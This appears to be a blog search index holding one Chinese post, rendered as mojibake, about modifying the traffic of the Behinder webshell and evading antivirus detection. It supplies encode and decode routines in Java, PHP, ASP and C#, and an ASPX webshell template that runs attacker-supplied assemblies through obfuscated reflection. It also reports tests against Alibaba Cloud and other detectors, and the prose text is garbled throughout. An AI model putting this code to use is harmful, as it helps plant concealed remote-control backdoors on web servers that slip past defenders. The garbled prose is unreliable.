<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å†°èäºŒå¼€ä»0åˆ°1-3-rebeyong4æµé‡é­”æ”¹åŠå…æ€</title>
      <link href="/2026/01/23/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3-rebeyong4%E6%B5%81%E9%87%8F%E9%AD%94%E6%94%B9%E5%8F%8A%E5%85%8D%E6%9D%80/"/>
      <url>/2026/01/23/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3-rebeyong4%E6%B5%81%E9%87%8F%E9%AD%94%E6%94%B9%E5%8F%8A%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>ç†Ÿæ‚‰å†°èçš„å°ä¼™ä¼´éƒ½çŸ¥é“ï¼Œå†°èv4.0ç›¸å¯¹äº3.0ç‰ˆæœ¬ï¼Œæ›´æ–°äº†è¾ƒå¤šå†…å®¹ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¼€æ”¾äº†ä¼ è¾“åè®®çš„è‡ªå®šä¹‰åŠŸèƒ½ï¼Œä½†æ˜¯ä¼¼ä¹å¹¶æ²¡æœ‰å¤šå°‘äººç”¨è¿‡å†°è4.0çš„å†…å®¹ï¼Œ4.0æ›´æ–°çš„ä¸»è¦å°±æ˜¯è®©ç”¨æˆ·å¯¹æµé‡çš„åŠ å¯†å’Œè§£å¯†è¿›è¡Œè‡ªå®šä¹‰ï¼Œå®ç°æµé‡åŠ è§£å¯†åè®®çš„å»ä¸­å¿ƒåŒ–ã€‚v4.0ç‰ˆæœ¬ä¸å†æœ‰è¿æ¥å¯†ç çš„æ¦‚å¿µï¼Œä½ çš„è‡ªå®šä¹‰ä¼ è¾“åè®®çš„ç®—æ³•å°±æ˜¯è¿æ¥å¯†ç ã€‚<br>ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æ— è®ºå†°èå’Œå“¥æ–¯æ‹‰éƒ½æ˜¯åœ¨ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œåè®®éƒ½æ˜¯å®šæ­»çš„ï¼Œæ¯”å¦‚è¯·æ±‚åŒ…å’Œå›æ˜¾åŒ…éƒ½è¿›è¡ŒaesåŠ å¯†ï¼Œaesè§£å¯†ã€‚è¿™ä¸ªaesåŠ è§£å¯†æ˜¯å®šæ­»çš„ï¼Œä½ æƒ³ç”¨desæ˜¯ä¸å¯ä»¥çš„ã€‚é‚£ä¹ˆå†°è4æ›´æ–°åï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰è‡ªå·±çš„åè®®ï¼Œä¹Ÿå°±å¯ä»¥å®ç°desäº†ã€‚<br>è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå…¶å®åœ¨èšå‰‘ä¸­æ—©å·²æœ‰äº†ï¼Œå°±æ˜¯ç¼–ç å’Œè§£ç å™¨ã€‚å¯ä»¥å®šä¹‰è‡ªå·±ç¼–ç å™¨ä¹Ÿå¯ä»¥ä¸å®šä¹‰è§£ç å™¨<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128170329995.png" alt="image-20260128170329995"></p><p>å°±æ˜¯è¿™æ ·ï¼Œè¯·æ±‚åŒ…æ··æ·†ï¼Œä½†æ˜¯è¿”å›åŒ…æ˜¯è£¸ç€çš„ã€‚è¿™ä¾¿æ˜¯è‡ªå®šä¹‰åè®®äº†ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹åº”è¯¥æ€ä¹ˆç”¨ï¼Œæ‰“å¼€å†°è4.0ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ä¸ªä¼ è¾“åè®®ç•Œé¢<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128173252148.png" alt="image-20260128173252148"></p><p>ç‚¹è¿›å»å°±å¯ä»¥çœ‹åˆ°ç›¸å…³çš„é…ç½®äº†ï¼Œè¿™é‡Œå…ˆè¯´ä¸€ä¸‹å†°èçš„æ•°æ®æµè½¬å›¾<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128173847851.png" alt="image-20260128173847851"></p><p>è¿™ä¸ªæ˜¯æ‰€æœ‰webshellçš„æ•°æ®æµè½¬å›¾ã€‚<br>å‡è®¾bohemianä¸ºpayloadï¼Œæœ¬åœ°åŠ å¯† bohemian ä¸º 098111104101109105097110å å‘å‡ºï¼Œåœ¨ğŸä¸­æœ‰ä¸€ä¸ªè§£å¯†å‡½æ•° ï¼ŒæŠŠ098111104101109105097110è§£ä¸ºbohemianï¼Œç„¶åeval(bohemian),æ‰§è¡Œçš„ç»“æœä¸ºbohemian ï¼ŒåŠ å¯†ä¸º098111104101109105097110ï¼Œå®¢æˆ·ç«¯å°†è·å¾—è¿”å›çš„098111104101109105097110è§£å¯†ä¸ºbohemianï¼Œæ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±åœ¨æµé‡ä¸­çœ‹åˆ°æ˜¯ç¼–ç è¿‡çš„æµé‡äº†ï¼Œä¸å†æ˜¯bohemianã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128174710259.png" alt="image-20260128174710259"></p><h5 id="æœ¬åœ°åŠ è§£å¯†"><a href="#æœ¬åœ°åŠ è§£å¯†" class="headerlink" title="æœ¬åœ°åŠ è§£å¯†"></a>æœ¬åœ°åŠ è§£å¯†</h5><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹æœ¬åœ°åŠ å¯†å’Œè§£å¯†ï¼ŒåŸç‰ˆæµé‡<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128181824341.png" alt="image-20260128181824341">è¿™é‡Œæˆ‘ä»¬æƒ³å®ç°çš„æµé‡æ˜¯ </p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128181841390.png" alt="image-20260128181841390"></p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆæœ¬åœ°åŠ è§£èœœï¼Œå¾ˆå¥½ç†è§£å› ä¸ºæˆ‘ä»¬çš„å®¢æˆ·ç«¯æ—¶javaå†™çš„ï¼Œé‚£ä¹ˆæœ¬åœ°åŠ å¯†å¿…ç„¶æ˜¯javaçš„ä»£ç ï¼Œä»¿ç…§æ¨¡æ¿è¿›è¡Œå†™ä¸€ä¸‹ï¼Œæœ¬åœ°åŠ å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] Encrypt(<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    StringBuilder out = <span class="keyword">new</span> StringBuilder(data.length * <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = data[i] &amp; <span class="number">0xFF</span>;   <span class="comment">// byte è½¬ intï¼Œé¿å…ç¬¦å·æ‰©å±•</span></span><br><span class="line">        out.append((<span class="keyword">char</span>) (<span class="string">&#x27;0&#x27;</span> + (v / <span class="number">100</span>)));</span><br><span class="line">        out.append((<span class="keyword">char</span>) (<span class="string">&#x27;0&#x27;</span> + ((v / <span class="number">10</span>) % <span class="number">10</span>)));</span><br><span class="line">        out.append((<span class="keyword">char</span>) (<span class="string">&#x27;0&#x27;</span> + (v % <span class="number">10</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out.toString().getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°è§£å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] Decrypt(<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String raw = <span class="keyword">new</span> String(data, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    String digits = raw.replaceAll(<span class="string">&quot;\\D&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (digits.length() % <span class="number">3</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;cipher length not multiple of 3: &quot;</span> + digits.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[digits.length() / <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digits.length(); i += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> ascii = (digits.charAt(i) - <span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span></span><br><span class="line">                  + (digits.charAt(i+<span class="number">1</span>) - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span></span><br><span class="line">                  + (digits.charAt(i+<span class="number">2</span>) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        result[i/<span class="number">3</span>] = (<span class="keyword">byte</span>) ascii;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gptç®€å•å†™ä¸€ä¸‹ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260128182249965.png" alt="image-20260128182249965"></p><p>å°±å¯ä»¥å®ç°äº†ã€‚</p><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>æ¥ä¸‹æ¥å®ç°php<br>phpå®ç°ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// éå†æ¯ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byte</span> = ord(<span class="variable">$data</span>[<span class="variable">$i</span>]); <span class="comment">// è·å– ASCII å€¼ï¼ˆ0â€“255ï¼‰</span></span><br><span class="line">        <span class="variable">$result</span> .= str_pad((<span class="keyword">string</span>)<span class="variable">$byte</span>, <span class="number">3</span>, <span class="string">&#x27;0&#x27;</span>, STR_PAD_LEFT); <span class="comment">// è½¬ä¸º3ä½åè¿›åˆ¶</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$input</span> = (<span class="keyword">string</span>)<span class="variable">$input</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$input</span>); <span class="variable">$i</span> += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="variable">$segment</span> = substr(<span class="variable">$input</span>, <span class="variable">$i</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$result</span> .= chr((<span class="keyword">int</span>)<span class="variable">$segment</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>; <span class="comment">// âœ… è¿”å›è§£å¯†åçš„åŸå§‹å­—ç¬¦ä¸²</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨phpå»å®ç°åŠ è§£å¯†å‡½æ•°å°±å¯ä»¥äº†ï¼Œæœ€åè¦returnä¸€ä¸‹ã€‚<br>ç„¶åå°±å¯ä»¥äº† æµ‹è¯•äº† ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129110514575.png" alt="image-20260129110514575"></p><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æµ‹é€šä»£ç äº†ã€‚ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç”¨äº†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129110758596.png" alt="image-20260129110758596"></p><p>æµ‹è¯•ä¸€ä¸‹åŠŸèƒ½ã€‚æ²¡æœ‰é—®é¢˜ã€‚<br>ä¸èƒ½è¯´æµé‡å¾ˆé‚£å•¥ï¼Œåªèƒ½è¯´ï¼Œè¿™ç§æµé‡ä½ è‚¯å®šæ˜¯ç¬¬ä¸€æ¬¡è§ã€‚<br>è¿™æ ·çš„åŒ–ï¼Œphpå°±æ”¹å¥½äº†ï¼Œé‚£ä¹ˆçœ‹ä¸€ä¸‹æœ¨é©¬<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129111236121.png" alt="image-20260129111236121"><br>è¿™å°±æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œæ²¡æœ‰é‚£ç§xorå•¥çš„çš„ï¼Œå°±æ˜¯çº¯çº¯çš„å­—ç¬¦è½¬asciiï¼Œä»£ç ä¹Ÿæ˜¯å¾ˆçŸ­çš„ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å…æ€äº†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129112124597.png" alt="image-20260129112124597"><br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129112143100.png" alt="image-20260129112143100"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129114034291.png"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129114051864.png" alt="image-20260129114051864"></p><p>å›´å¸ƒè¿™å°å­ï¼Œå’‹æ”¹éƒ½æ˜¯æœªçŸ¥ï¼Œgptåˆ†æçš„å˜å˜å¯¹ï¼Œå°±è¿™å§ï¼Œå¤ªèœäº†ã€‚</p><p>é˜¿é‡Œäº‘æ€ä¹ˆå¯¹æŠ—éƒ½æ˜¯ å¯ç–‘  ç®€ç›´è¿‡ä¸å»ï¼Œæ²³é©¬æ˜¾ç¤ºæœºå™¨å­¦ä¹ ï¼Œè¿™æœºå™¨å­¦ä¹ è¿˜æŒºå‰å®³ï¼Œå¤§æ¦‚ç‡è¿˜æ˜¯evalé‚£é‡Œï¼Œåé¢æˆ‘ä»¬åœ¨ç ”ç©¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯æŠŠæœ¨é©¬å˜é‡æ•´æˆåŠ¨æ€çš„å³å¯äº†ã€‚èŠ±è´¹ä¸€ç‚¹æ—¶é—´è°ƒä¸€ä¸‹ã€‚</p><h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>æ¥ä¸‹æ¥æ˜¯jsp,æˆ‘ä»¬æœ¬åœ°çš„ä»£ç åªéœ€è¦ä¸€æ¬¡å³å¯ï¼Œä¸éœ€è¦å†jspä¸­å†æ¬¡è¿›è¡Œå†™äº†ï¼Œè¿œç¨‹è¿˜æ˜¯è¦å†™ä¸€ä¸‹çš„ã€‚å…¶å®ä¹Ÿä¸ç”¨ï¼Œæˆ‘ä»¬æœ¬åœ°å’Œè¿œç¨‹çš„jspçš„åŠ è§£å¯†ç”¨çš„æ˜¯ä¸€ä¸ªä»£ç ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129112928161.png" alt="image-20260129112928161"><br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129113233621.png" alt="image-20260129113233621"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129113259485.png" alt="image-20260129113259485"></p><p>ä¼šè¯æµé‡ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129113640849.png" alt="image-20260129113640849"></p><p>å…æ€çš„è¯¦ç»†å°±ä¸åœ¨è¿™é‡Œè®²äº†ï¼Œæœ‰å…´è¶£çš„åŒå­¦çœ‹çœ‹ä»¥å‰çš„å…æ€æ€è·¯ï¼Œä¸‡å˜ä¸ç¦»å…¶å®—ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129114223166.png" alt="image-20260129114223166"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129114242800.png" alt="image-20260129114242800"></p><p>ä¸çŸ¥é“ä¸ºå•¥jspå¾®æ­¥çš„gptä¸ä»‹ç»ä¸€ä¸‹äº†ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ— èŠçš„èŠ±ä¸€ç‚¹æ—¶é—´è¿›è¡Œå°è£…å’ŒåŠ¨æ€çš„æ›¿æ¢å˜é‡äº†ï¼Œä¸åœ¨è¯¦ç»†ä»‹ç»ã€‚</p><h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>aspçš„è¯ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œå…ˆæŠŠå­—ç¬¦ä¸²çš„åŠ è§£å¯†å‡½æ•°å†™ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Function Encrypt(data)</span><br><span class="line">    Dim result, i, ch, asciiStr</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    For i = 1 To Len(data)</span><br><span class="line">        ch = Mid(data, i, 1)</span><br><span class="line">        asciiStr = CStr(Asc(ch))  &#x27; æŠŠå­—ç¬¦è½¬æˆASCIIæ•°å­—å­—ç¬¦ä¸²</span><br><span class="line">        If Len(asciiStr) &lt; 3 Then</span><br><span class="line">            asciiStr = String(3 - Len(asciiStr), &quot;0&quot;) &amp; asciiStr</span><br><span class="line">        End If</span><br><span class="line">        result = result &amp; asciiStr</span><br><span class="line">    Next</span><br><span class="line">    Encrypt = result</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function Decrypt(content)</span><br><span class="line">    Dim iByte, strData</span><br><span class="line">    Dim result, i, segment, ascii</span><br><span class="line">    strData = &quot;&quot;</span><br><span class="line">    For iByte = 1 To LenB(content)</span><br><span class="line">        strData = strData &amp; Chr(AscB(MidB(content, iByte, 1)))</span><br><span class="line">    Next</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    For i = 1 To Len(strData) Step 3</span><br><span class="line">        segment = Mid(strData, i, 3)</span><br><span class="line">        If IsNumeric(segment) Then</span><br><span class="line">            ascii = CInt(segment)</span><br><span class="line">            result = result &amp; Chr(ascii)</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129142742622.png" alt="image-20260129142742622"></p><p>æ¥çœ‹ä¸‹æµé‡ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129142931843.png" alt="image-20260129142931843"></p><p>aspçš„æµé‡æœ‰ç‚¹å°æ€ªï¼Œè¿”å›åŒ…ä¸­é—´æœ‰ç©ºæ ¼<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129143034682.png" alt="image-20260129143034682"></p><p>å’Œè¿™ä¸ªresponse.wite å’Œ  response.binarywrite æœ‰å…³ã€‚è¿™é‡Œèƒ½ç”¨  å…ˆä¸æ”¹æºç ã€‚<br>ç„¶åèŠ±ä¸€ç‚¹æ—¶é—´ï¼Œè¿›è¡Œå…æ€å’ŒåŠ¨æ€å˜é‡ä¸€ä¸‹ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129143857331.png" alt="image-20260129143857331"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129143935264-17696687755252-17696687772333.png" alt="image-20260129143935264"></p><p>å…æ€ä¾æ—§æ²¡é—®é¢˜ï¼Œå°±æ˜¯å•¥æŠŠï¼Œè¿™ä¸ªå¾®æ­¥æœ‰æ²¡æœ‰gptäº†ã€‚</p><p>aspå¯ä»¥è¿‡é˜¿é‡Œäº‘</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129155507475.png" alt="image-20260129155507475"></p><p>ä¾ç„¶è¿˜æ˜¯è¿‡ä¸äº†é˜¿é‡Œäº‘ï¼Œå¤ªéš¾äº†ã€‚</p><h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>aspxçš„è¯å‘¢ï¼Œä¹Ÿä¸éš¾ï¼Œå…ˆå†™ä¸€ä¸‹åŠ è§£å¯†å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">private byte[] Encrypt(byte[] data)</span><br><span class="line">&#123;</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    foreach (byte b in data)</span><br><span class="line">    &#123;</span><br><span class="line">        sb.Append(b.ToString(&quot;D3&quot;)); // æ¯ä¸ªå­—èŠ‚è½¬3ä½æ•°å­—</span><br><span class="line">    &#125;</span><br><span class="line">// æŠŠå­—ç¬¦ä¸²å†è½¬å› byte[]ï¼Œç”¨äºç½‘ç»œä¼ è¾“æˆ–å†™å…¥æ–‡ä»¶</span><br><span class="line">    return Encoding.UTF8.GetBytes(sb.ToString());</span><br><span class="line">&#125;</span><br><span class="line">private byte[] Decrypt(byte[] encodedData)</span><br><span class="line">&#123;</span><br><span class="line">    string str = Encoding.UTF8.GetString(encodedData);</span><br><span class="line">    List&lt;byte&gt; result = new List&lt;byte&gt;();</span><br><span class="line">    for (int i = 0; i &lt; str.Length; i += 3)</span><br><span class="line">    &#123;</span><br><span class="line">        string segment = str.Substring(i, 3);</span><br><span class="line">        byte b = byte.Parse(segment);</span><br><span class="line">        result.Add(b);</span><br><span class="line">    &#125;</span><br><span class="line">    return result.ToArray(); // å¾—åˆ°åŸå§‹å­—èŠ‚æ•°ç»„</span><br><span class="line">&#125;</span><br><span class="line">//æ¨¡æ¿</span><br><span class="line">        &lt;%%</span><br><span class="line">        //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(%s(c)).CreateInstance(&quot;U&quot;).Equals(this);</span><br><span class="line">        if (Request.HttpMethod == &quot;POST&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">        byte[] c=Request.BinaryRead(Request.ContentLength);</span><br><span class="line">                string asname=System.Text.Encoding.ASCII.GetString(new byte[] &#123;0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79&#125;);</span><br><span class="line">                Type assembly=Type.GetType(asname);</span><br><span class="line">                MethodInfo load = assembly.GetMethod(&quot;Load&quot;,new Type[] &#123;new byte[0].GetType()&#125;);</span><br><span class="line">                object obj=load.Invoke(null, new object[]&#123;Decrypt(c)&#125;);</span><br><span class="line">                MethodInfo create = assembly.GetMethod(&quot;CreateInstance&quot;,new Type[] &#123; &quot;&quot;.GetType()&#125;);</span><br><span class="line">                string name = System.Text.Encoding.ASCII.GetString(new byte[] &#123; 0x55 &#125;);</span><br><span class="line">                object pay=create.Invoke(obj,new object[] &#123; name &#125;);</span><br><span class="line">                pay.Equals(this);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        %%&gt;</span><br></pre></td></tr></table></figure><p>åŸæœ¬çš„æ¨¡æ¿å°±ä¸åœ¨æ›¿æ¢äº†ã€‚åªå†™åŠ è§£å¯†å‡½æ•°å³å¯ã€‚<br><img 